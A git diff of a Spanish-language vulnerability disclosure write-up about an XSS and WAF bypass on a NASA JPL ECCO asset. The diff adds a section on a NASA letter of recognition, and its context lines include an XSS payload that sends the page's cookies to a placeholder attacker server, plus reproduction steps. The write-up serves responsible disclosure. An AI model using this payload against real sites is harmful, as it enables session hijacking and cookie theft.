@@ -140,6 +140,20 @@ Payload: `pwn');a=document;fetch('https://ATTACKER_SERVER/s='+a.cookie)</script>
 
 ---
 
+## 🎖️ Reconocimiento y Premio
+
+Tras la divulgación ética, recibí una **Carta de Reconocimiento** del **NASA Jet Propulsion Laboratory (JPL)** reconociendo el impacto de la investigación y su contribución a la seguridad de sus activos.
+
+<div class="pdf-container">
+  <iframe src="../../../assets/others/nasa-jpl-ecco-xss-waf-bypass/Letter%20of%20Recognition%20-%20NASA%20Vulnerability%20Disclosure%20ConnorDev.pdf" width="100%" height="100%" frameborder="0"></iframe>
+</div>
+
+<p style="text-align: center;">
+  <a href="../../../assets/others/nasa-jpl-ecco-xss-waf-bypass/Letter%20of%20Recognition%20-%20NASA%20Vulnerability%20Disclosure%20ConnorDev.pdf" class="lang-btn" target="_blank">📥 Descargar Carta Oficial (PDF)</a>
+</p>
+
+---
+
 ## 🎯 Pasos para Reproducir
 
 1. Iniciar un servidor web público (ej. usando Serveo exponiendo un servidor python local).
@@ -156,4 +170,3 @@ Esta investigación fue realizada en una **colaboración al 50%** entre **{{ sit
 
 **{{ site.researchers.ivan.name }}** ([Bugcrowd]({{ site.researchers.ivan.bugcrowd }}))
 **{{ site.researchers.diego.name }}** ([Bugcrowd]({{ site.researchers.diego.bugcrowd }}))
-
